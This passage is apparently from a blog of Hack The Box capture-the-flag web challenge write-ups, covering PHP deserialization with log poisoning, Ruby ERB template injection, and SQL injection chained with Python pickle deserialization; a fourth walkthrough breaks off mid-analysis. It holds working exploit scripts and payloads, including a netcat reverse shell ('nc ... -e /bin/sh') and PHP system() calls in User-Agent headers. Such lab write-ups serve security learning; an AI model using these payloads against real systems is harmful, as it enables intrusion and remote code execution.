base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);unserialize($cookie); The page is deserialize the cookie to render the page. The url file page being render is being indicate in the file attribute. Below is the breakdown of the seralized object - `O:9:&quot;PageModel&quot;:1`: - `O`: Denotes an object. - `9`: The length of the serialized string. - `&quot;PageModel&quot;`: Name of the class (in this case, &quot;PageModel&quot;). - `1`: Indicates there is 1 property in the serialized object.- `&#123;s:4:&quot;file&quot;;s:15:&quot;/www/index.html&quot;;&#125;`: - `s:4:&quot;file&quot;;`: Represents a string with a length of 4 characters for the property name &quot;file&quot;. - `s:15:&quot;/www/index.html&quot;;`: Represents a string with a length of 15 characters for the value &quot;/www/index.html&quot;. The only field we have to modify is the s:15:&quot;/www/index.html&quot;. Then we can have a control of what is being render in the page. ┌──(ikonw㉿Xing)-[~/Desktop/htb_challenge/RenderQuest]└─$ echo &#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;&#x27; | base64Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K After some trial and error, I dont seem to show the /flag.txt. Checking the docker it seems the filename is being by randomly renamed in entrypoint.sh !/bin/ash# Secure entrypointchmod 600 /entrypoint.sh# Generate random flag filenamemv /flag /flag_`cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1`exec &quot;$@&quot; we have no way to extract the file without knowing the name. Since we are able to have local file inclusion, we can always perform log poisoning. Review the Dockerfile, the webserver is using nginx, which means we can find the access.log file located at /var/log/nginx/access.log Changed the User-Agent to executes PHP codes Below is the full script to extract the flag name and the content using regex. import requestsimport base64import reurl = &quot;http://167.99.85.216:30412/&quot;cookie = b&#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;&#x27;cookie = base64.b64encode(cookie)header = &#123;&quot;PHPSESSID&quot;: cookie.decode()&#125;print(cookie)headers = &#123;&quot;User-Agent&quot;: &quot;&lt;?php system(&#x27;ls -la /&#x27;)?&gt;&quot;&#125;r = requests.get(url,cookies=header, headers=headers)flag = re.search(r&#x27;\\bflag_\\w+\\b&#x27;, r.text, flags=re.IGNORECASE)flag = flag.group()headers = &#123;&quot;User-Agent&quot;: f&quot;&lt;?php system(&#x27;cat /&#123;flag&#125;&#x27;)?&gt;&quot;&#125;print(headers)r = requests.get(url,cookies=header, headers=headers)print(r.text) Neonify - Easy It’s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube! In neon.rb file indicate POST method route seems using ERB template engine to render user inputs. class NeonControllers &lt; Sinatra::Base configure do set :views, &quot;app/views&quot; set :public_dir, &quot;public&quot; end get &#x27;/&#x27; do @neon = &quot;Glow With The Flow&quot; erb :&#x27;index&#x27; end post &#x27;/&#x27; do if params[:neon] =~ /^[0-9a-z ]+$/i @neon = ERB.new(params[:neon]).result(binding) else @neon = &quot;Malicious Input Detected&quot; end erb :&#x27;index&#x27; end The regex match the start and the end of the line, and matches alphanumeric and whitespace only. With some research that Ruby regex has some form of insecure use of Regular expressions. According to hacktrick we can supply the following payload for reading files &lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt; In order to abuse the insecure regex in ruby, burp request seems have problem with the \\n. We can just firefox to modify the request to manually append a new line just like this in network tab However I did receive a 400 error request. After some research, I perform a URL encode seems to get the things right neon=a%3C%25%3D%20File.open(%27%2Fetc%2Fpasswd%27).read%20%25%3E Yeah, manage to read the file, now we can just change /etc/passwd to /flag.txt and we got the flag. C.O.P - Easy The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation! Perform a blackbox approach first, found the site shows the ID of the item. Found the item to be listed on the URL http://localhost:1337/view/1 Tried with sqlmap to identify any possible SQLi. However there’s some problem with the URL, as it dont have paramter to inject, need to manually added a * in burp request and save it GET /view/1* HTTP/1.1Host: localhost:1337User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1 sqlmap -r requests.txt --dump-all+----+----------------------------------------------------------------------------------| id | data | created_at |+----+----------------------------------------------------------------------------------| 1 | gASVoAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDFBpY2tsZSBTaGlydJSMC2Rlc2NyaXB0aW9ulIwZR2V0IG91ciBuZXcgcGlja2xlIHNoaXJ0IZSMBWltYWdllIwfL3N0YXRpYy9pbWFnZXMvcGlja2xlX3NoaXJ0LmpwZ5SMBXByaWNllIwCMjOUdWIu | 2024-01-02 13:44:09 || 2 | gASVrAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDlBpY2tsZSBTaGlydCAylIwLZGVzY3JpcHRpb26UjCJHZXQgb3VyIChzZWNvbmQpIG5ldyBwaWNrbGUgc2hpcnQhlIwFaW1hZ2WUjCAvc3RhdGljL2ltYWdlcy9waWNrbGVfc2hpcnQyLmpwZ5SMBXByaWNllIwCMjeUdWIu | 2024-01-02 13:44:09 || 3 | gASVnQAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0RpbGwgUGlja2xlIEphcpSMC2Rlc2NyaXB0aW9ulIwXTGl0ZXJhbGx5IGp1c3QgYSBwaWNrbGWUjAVpbWFnZZSMGS9zdGF0aWMvaW1hZ2VzL3BpY2tsZS5qcGeUjAVwcmljZZSMBDEzMzeUdWIu | 2024-01-02 13:44:09 || 4 | gASVsgAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0JyYW5zdG9uIFBpY2tsZZSMC2Rlc2NyaXB0aW9ulIwjRG9lcyB0aGlzIGV2ZW4gZml0IG9uIG91ciBzdG9yZT8hPyGUjAVpbWFnZZSMIi9zdGF0aWMvaW1hZ2VzL2JyYW5zdG9uX3BpY2tsZS5qcGeUjAVwcmljZZSMBDcuMzCUdWIu | 2024-01-02 13:44:09 |+----+---------------------------------------------------------------------------------- Found some encoded value, decode with base64 seems like some seralization. Proceed with source code analysis. class shop(object): @staticmethod def select_by_id(product_id): return query_db(f&quot;SELECT data FROM products WHERE id=&#x27;&#123;product_id&#125;&#x27;&quot;, one=True) The parameter does not have any sanitization The application seems to serialized the item object and base64 encode and save it in database. @app.template_filter(&#x27;pickle&#x27;)def pickle_loads(s): return pickle.loads(base64.b64decode(s)) In item.html the template engine deserialize the items and render on webpage. &#123;% set item = product | pickle %&#125; Since it dont have any restriction, we can passed in a base64 encoded object that trigger a os.system command to achieve RCE. In the payload class, we use the __reduce__ method to create and return a tuple that includes the operating system command as an argument. Then, from that payload class, we create an object, serialize and encode it. Once again, using Base64, we’ll just need the input from there. import base64import osimport picklepayload = &#x27;nc 172.17.0.1 4444 -e /bin/sh&#x27;class exploit: def __reduce__(self): return os.system, (payload,)if __name__ == &#x27;__main__&#x27;: print(base64.urlsafe_b64encode(pickle.dumps(exploit())).decode(&#x27;ascii&#x27;)) From here we got the base64 encoded string gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg== Now we have to construct the parameter that abuse the SQLI to deserizlise malicious object.&#96; http://localhost:1337/view/&#x27;%20UNION%20SELECT%20&#x27;gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg== EasterBunny - Easy It’s that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny’s helpers are watching! Break down the routes.js router.get(&quot;/&quot;, (req, res) =&gt; &#123; return res.render(&quot;index.html&quot;, &#123; cdn: `$&#123;req.protocol&#125;://$&#123;req.hostname&#125;:$&#123;req.headers[&quot;x-forwarded-port&quot;] ?? 80&#125;/static/`, &#125;);&#125;); The / path define that, it will render the index.html and pass the CDN url to it. To be more detailed as not familiar with node js syntax. The $$ operator used here is the Nullish Coalescing Operator in javascript. It returns the value if the left hand operand if it’s not null or undefined. If the left-hand side is null or uundefined it returns the right hand operand in this case is 80 cdn: `$&#123;req.protocol&#125;://$&#123;req.hostname&#125;:$&#123;req.headers[&quot;x-forwarded-port&quot;] ?? 80&#125;/static/`, same goes to the second endpoint /letter router.get(&quot;/letters&quot;, (req, res) =&gt; &#123; return res.render(&quot;viewletters.html&quot;, &#123; cdn: `$&#123;req.protocol&#125;://$&#123;req.hostname&#125;:$&#123;req.headers[&quot;x-forwarded-port&quot;] ?? 80&#125;/static/`, &#125;);&#125;); third endpoint /submit. Its a post method, checking if parameter message is exist in the request body. if it does not exist or empty it will exit. Next, if the message exist, it will inject the message into database using the method db.insertMessage. If the message is successful insert into database, it will trigger a bot to visit the speceific URL router.post(&quot;/submit&quot;, async (req, res) =&gt; &#123; const &#123; message &#125; = req.body; if (message) &#123; return db.insertMessage(message) .then(async inserted =&gt; &#123; try &#123; botVisiting = true; await visit(`http://127.0.0.1/letters?id=$&#123;inserted.lastID&#125;`, authSecret); botVisiting = false; &#125; catch (e) &#123; console.log(e); botVisiting = false; &#125; res.status(201).send(response(inserted.lastID)); &#125;) .catch(() =&gt; &#123; res.status(500).send(response(&#x27;Something went wrong!&#x27;)); &#125;); &#125; return res.status(401).send(response(&#x27;Missing required parameters!&#x27;));&#125;); Cyber Apocalypse 2024","categories":[],"tags":[]}],"categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"},{"name":"php-audit","slug":"php-audit","permalink":"https://ik0nw.github.io/categories/php-audit/"},{"name":"hackthebox-challenge","slug":"hackthebox-challenge","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/"},{"name":"mobile","slug":"hackthebox-challenge/mobile","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/mobile/"},{"name":"HackTheBox-Hard","slug":"HackTheBox-Hard","permalink":"https://ik0nw.github.io/categories/HackTheBox-Hard/"},{"name":"CTF","slug":"CTF","permalink":"https://ik0nw.github.io/categories/CTF/"},{"name":"misc","slug":"hackthebox-challenge/misc","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/misc/"},{"name":"HackTheBox-Medium","slug":"HackTheBox-Medium","permalink":"https://ik0nw.github.io/categories/HackTheBox-Medium/"}],"tags":[{"name":"offsec","slug":"offsec","permalink":"https://ik0nw.github.io/tags/offsec/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"easy","slug":"easy","permalink":"https://ik0nw.github.io/tags/easy/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"},{"name":"PHP,in_array(),type-juggling","slug":"PHP-in-array-type-juggling","permalink":"https://ik0nw.github.io/tags/PHP-in-array-type-juggling/"},{"name":"PHP,preg_replace()","slug":"PHP-preg-replace","permalink":"https://ik0nw.github.io/tags/PHP-preg-replace/"},{"name":"reverse","slug":"reverse","permalink":"https://ik0nw.github.io/tags/reverse/"},{"name":"mysql exec_cmd","slug":"mysql-exec-cmd","permalink":"https://ik0nw.github.io/tags/mysql-exec-cmd/"},{"name":"gitalk","slug":"gitalk","permalink":"https://ik0nw.github.io/tags/gitalk/"},{"name":"hard","slug":"hard","permalink":"https://ik0nw.github.io/tags/hard/"},{"name":"forensic","slug":"forensic","permalink":"https://ik0nw.github.io/tags/forensic/"},{"name":"smb","slug":"smb","permalink":"https://ik0nw.github.io/tags/smb/"}]}